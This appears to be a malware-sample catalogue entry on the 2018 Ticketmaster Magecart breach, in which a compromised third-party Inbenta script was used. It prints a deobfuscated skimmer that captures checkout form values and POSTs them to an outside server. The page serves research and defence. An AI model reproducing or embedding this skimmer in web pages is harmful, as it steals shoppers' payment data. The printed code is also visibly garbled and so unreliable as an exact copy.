---
title: Ticketmaster magecart skimmer
date: '2018-06-09'
tags:
  - web
  - supply-chain
  - magecart
  - e-skimmer
---

Ticketmaster's checkout page included a third party JavaScript resource hosted by Inbenta. Inbenta and this script became compromised with an obfuscated payload added. The deobfuscated code is below and shows the skimmer grabbing payment data from form input values and sending them to a third party server.

If you have the obfuscated code, please submit it as a sample.

- - -

## References

- [Inside and Beyond Ticketmaster: The Many Breaches of Magecart](https://www.riskiq.com/blog/labs/magecart-ticketmaster-breach/)

## Payload

```js
var skimmer = {
  snd: null,
  gate: "https://webfotce.me/js/form.js",
    myid: (function(cname) {
      var cd = document.cookie.match(new RegExp("( ? : ^ | ;)" + cname.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\$1") + " = ([ ^ ;] * )"));
      return cd ? decodeURIComponent(cd[1]) : undefined
    })("setidd") || (function() {
      var d = new Date();
      var time_id = d.getTime() + " -" +Math.floor(Math.random() * (999999999– 11111111 + 1) + 11111111);
      var exp = new Date(new Date().getTime() + 60 * 60 * 24 * 1000);
      document.cookie = "setidd = "+time_id + ";
      path = /; expires=" + exp.toUTCString();
      return time_id
    })(),
  clk: function() {
    skimmer.snd. = null;
    var inp = document.querySelectorAll("input, select, textarea, checkbox, button");
    for (var i = 0; i < inp.length; i++) {
      if (inp[i].value.length > 0) {
        var nme = inp[i].name;
        if (nme == ”) {
          nme = i
        };
        skimmer.snd += inp[i].name + " = "+inp[i].value + " & "
      }
    }
  },
  send: function() {
    try {
      var btn = document.querySelectorAll("a[href *= \"javascript: void(0)\"], button, input, submit, .btn, .button");
      for (var i = 0; i < btn.length; i++) {
        var b = btn[i];
        if (b.type != "text" && b.type != "select" && b.type != "checkbox" && b.type != "password" && b.type != "radio") {
          if (b.addEventListener) {
            b.addEventListener("click", skimmer.clk, false)
          } else {
            b.attachEvent("onclick", skimmer.clk)
          }
        }
      };
      var frm = document.querySelectorAll("form");
      for (var i = 0; i < frm.length; i++) {
        if (frm[i].addEventListener) {
          frm[i] addEventListener("submit", skimmer.clk, false)
        } else {
          frm[i].attachEvent("onsubmit", skimmer.clk)
        }
      };
      if (skimmer.snd != null) {
        var hostname = location.hostname.split(".").slice(0).join("_") || "nodomain";
        var enc_info = btoa(skimmer.snd);
        var http = new XMLHttpRequest();
        http.open("POST", skimmer.gate, true);
        http.setRequestHeader("Content - type", "application / x - www - form - urlencoded");
        http.send("info = "+enc_info + " & hostname = ticketmUK & key = "+skimmer.myid)
      };
      skimmer.snd = null;
      enc_info = null;
      setTimeout(function() {
        skimmer.send()
      }, 30)
    } catch (e) {}
  }
};
if ((new RegExp("order | checkout | onestep", "gi")).test(window.location)) {
  skimmer.send()
}
```
